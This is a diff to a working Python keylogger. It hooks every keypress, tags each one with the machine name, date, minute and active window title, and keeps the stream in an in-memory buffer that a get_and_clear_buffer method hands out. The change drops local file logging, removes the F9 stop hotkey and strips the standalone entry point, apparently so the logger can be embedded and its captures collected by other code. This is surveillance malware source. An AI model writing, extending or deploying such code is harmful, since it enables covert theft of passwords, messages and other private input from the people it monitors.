@@ -1,18 +1,16 @@
-import keyboard, json, socket, os, re
+import keyboard, socket, re, unicodedata
 from datetime import datetime
-import pygetwindow as gw, unicodedata
+import pygetwindow as gw
+
 
 class KeyLogger:
-    def __init__(self, log_file="log.json"):
-        self.log_file, self.machine_name, self.running = log_file, socket.gethostname(), True
-        if os.path.exists(log_file):
-            try: self.data = json.load(open(log_file, "r", encoding="utf-8"))
-            except: self.data = {}
-        else: self.data = {}
+    def __init__(self):
+        self.machine_name = socket.gethostname()
+        self.running = True
+        self.buffer = {}
 
     def clean_title(self, title):
         if not title: return "Unknown"
-        # מסיר תווים בלתי נראים + מספרים בתחילה + סיומות דפדפן
         title = "".join(c for c in title if unicodedata.category(c)[0] != "C")
         title = re.sub(r"^\(\d+\)\s*", "", title)
         return title.replace(" - Microsoft Edge","").replace(" - Google Chrome","").strip()
@@ -22,18 +20,22 @@ class KeyLogger:
 
     def log_event(self, e):
         if not self.running: return
-        date, minute, window = datetime.now().strftime("%Y-%m-%d"), datetime.now().strftime("%H:%M"), self.clean_title(getattr(gw.getActiveWindow(),"title",""))
-        d = self.data.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
-        self.data[self.machine_name][date][minute][window] = d + self.format_key(e.name)
-        json.dump(self.data, open(self.log_file,"w",encoding="utf-8"), ensure_ascii=False, indent=4)
+        date = datetime.now().strftime("%Y-%m-%d")
+        minute = datetime.now().strftime("%H:%M")
+        window = self.clean_title(getattr(gw.getActiveWindow(),"title",""))
 
-    def stop(self): os._exit(0)
+        d = self.buffer.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
+        self.buffer[self.machine_name][date][minute][window] = d + self.format_key(e.name)
+
+    def get_and_clear_buffer(self):
+        data = self.buffer
+        self.buffer = {}
+        return data
+
+    def stop(self):
+        self.running = False
 
     def start(self):
         keyboard.on_press(self.log_event)
-        keyboard.add_hotkey("F9", self.stop)
-        print("Keylogger started. Press F9 to stop.")
+        print("Keylogger started. Press CTRL+C to stop.")
         keyboard.wait()
-
-if __name__ == "__main__":
-    KeyLogger().start()
